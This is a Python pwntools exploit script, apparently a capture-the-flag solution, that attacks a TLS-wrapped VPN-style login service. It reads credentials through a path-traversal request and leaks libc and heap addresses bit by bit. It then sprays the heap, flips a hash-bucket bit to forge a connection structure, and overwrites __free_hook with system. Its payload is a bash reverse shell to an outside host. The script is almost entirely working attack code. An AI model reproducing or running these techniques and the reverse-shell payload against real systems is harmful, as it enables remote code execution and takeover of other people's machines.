from pwn import *
import ssl

# I was lazy to dump all of the hashes from the memory


def hasher(s2):
    v3, v4, v5 = 0, 0, 0

    def normalize():
        nonlocal v3, v4, v5
        v3 &= 0xffffffff
        v4 &= 0xffffffff
        v5 &= 0xffffffff
    v4 = ((s2 >> 24) << 24) - 1640531527
    normalize()
    v4 += (s2 >> 16) << 16
    v4 += (s2 >> 8) << 8
    v4 += s2 & 0xff
    normalize()
    v4 += 1640531527
    v4 += 17973517
    v4 ^= 0x7F76D
    normalize()
    v5 = (v4 << 8) ^ (-1622558010 - v4)
    v3 = -17973517 - v4 - v5
    normalize()
    v3 ^= v5 >> 13
    normalize()
    v4 -= v5
    v4 -= v3
    normalize()
    v4 ^= v3 >> 12
    normalize()
    v5 -= v3
    v5 -= v4
    v5 ^= v4 << 16
    normalize()
    v3 -= v4
    v3 -= v5
    v3 ^= v5 >> 5
    normalize()
    v4 -= v5
    v4 -= v3
    normalize()
    v4 ^= v3 >> 3
    v5 -= v3
    v5 -= v4
    v5 ^= v4 << 10
    v3 -= v4
    v3 -= v5
    normalize()
    v3 ^= v5 >> 15
    normalize()
    return v3


assert hasher(0x24) == 0x3B24BC22

HOST = '127.0.0.1'
PORT = 443

if True:
    r = remote('111.186.58.249', 10000)
    r.recvuntil('python3 pow.py ')
    cmd = r.recvline().split(b' ')
    out = subprocess.check_output(['/pow', *cmd])
    r.send(out)
    r.recvuntil('//')
    HOST, PORT = r.recvuntil(b',', drop=True).decode().split(':')
    PORT = int(PORT)
    print(HOST, PORT)

payload = 'rea1user:re4lp4ssw0rd'
if HOST == '127.0.0.1':
    payload = 'fakeuser:fakepassword'
context.log_level = 'error'

if False:  # payload from the server
    r = socket.create_connection((HOST, PORT))
    # pwntools SSL have bugs; it terminates the connection for some reason
    r = ssl.wrap_socket(r)
    r.send(b'GET /.%2e/user.txt HTTP/1.1\r\n\r\n')
    payload = r.recv(1024).split('\r\n')[-1].strip()

gateway = 0x0AC1F0001 & 0x0FFFF0000
vpn = 0x0A010100

USER, PW = payload.split(':')


def packet(cmd, payload):
    return p32(0xdeadbeef)+p16(len(payload) + 8)[::-1]+p16(cmd)+payload


def check_vip(vip):
    return packet(3, p32(vip & 0xffffffff)[::-1])


def req_vip(vip):
    return packet(1, p32(vip & 0xffffffff)[::-1])


body = f'name={USER}&passwd={PW}'


def recvuntil(self, payload):
    data = b''
    if isinstance(payload, str):
        payload = payload.encode()
    while payload not in data:
        chunk = self.recv(1)
        data += chunk
        if not chunk:
            break
    return data


def recvall(self):
    return self.recvuntil(os.urandom(8))


ssl.SSLSocket.recvuntil = recvuntil
ssl.SSLSocket.recvall = recvall


def login(payload):
    time.sleep(0.05)
    r = socket.create_connection((HOST, PORT))
    r = ssl.wrap_socket(r)
    r.settimeout(1000)
    r.send(f'''POST /login HTTP/1.1\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: {len(body)}\r
\r
{body}'''.encode() + payload)
    r.recvuntil('login')
    return r


HEAP_OFFSET = 0x23500  # The relative offset of dhcp_pool.contents


def leak(ranges):
    ranges = list(ranges)
    r = login(flat([check_vip(offset + gateway) for offset in ranges]))
    data = r.recvuntil(b' success')
    chunks = b''
    while chunks.count(p32(0xdeadbeef)) != len(ranges):
        chunks += r.recv(1024)
    chunks = chunks[8::12]
    r.close()
    return chunks


def leak8(offset, size=8):
    start = offset * 8
    result = [(1 - x) << i for i,
              x in enumerate(leak(range(start, start + size * 8)))]
    return sum(result)


stderr = leak8(-0x23318+0x140)
heap = leak8(-0x52f0)-0x1ef40
conn = heap + 0x25990
base = heap + 0x23500
buf = heap + 0x26b90
print(hex(heap))
libc = stderr-0x00000000001EC5C0
system = libc + 0x55410
free_hook = libc + 0x1eeb28
print(hex(stderr))

spray = b'A' * 0xf000
r1 = login(check_vip(2 + gateway))
r1.send(packet(3, p32(gateway).ljust(len(spray), b'\x00')))
r1.recvuntil(p32(0xdeadbeef))
time.sleep(0.5)
rs = [login(check_vip(2 + i + gateway)) for i in range(32)]

bases = []
fd = [38, 9, 36, 26, 32, 21, 35, 29, 12, 4294967295, 4294967295, 25, 4294967295, 4294967295, 18, 30,
      4294967295, 27, 8, 23, 4294967295, 34, 4294967295, 33, 11, 4294967295, 7, 31, 37, 19, 4294967295, 28]

# Dump all buckets in the hash table, and find if flipping a bit will make the connection structure point our buffer
for i in range(32):
    bases.append(leak8(-0x3260 + i * 16))
    found = False
    if bases[-1]:
        print(hex(bases[-1]), hex(bases[-1] - buf))
        for const in (0x20000, 0x40000, 0x10000):
            target = bases[-1] & ~const
            if buf <= target <= buf + 0xf000:
                print('found')
                found = True
                break
    if found:
        break

# Flip one bit of the bucket
ANOTHER = -1
rs[ANOTHER].send(req_vip((-0x3260 + i * 16) * 8 +
                         const.bit_length() - 1 + gateway))

# Fill the sprayed area with fake connection structure
r1.send(packet(1337, flat({0x818+target-buf: {0: [
    1,
    fd[i],
    1,
    0,
    0, 0, 0x10000000, 0, p64(free_hook - 8),
    0, 0, 0, 0, p64(target-0x40+0x80)
], 0x40: [p64(0) * 5, p64(bases[-1] - 0x40 + 4), 4, hasher(fd[i])], 0x80: f'bash -c "bash -i >& /dev/tcp/my-server/1 0>&1"'}}).ljust(len(spray))))
r1.recvall()
r1.close()

# Overwrite __free_hook to make it point system
for r in rs[::-1]:
    if r != rs[ANOTHER]:
        try:
            r.send(packet(2, p64(system)))
            r.interactive()
        except:
            pass
print('yey', hex(target - buf))
pause()
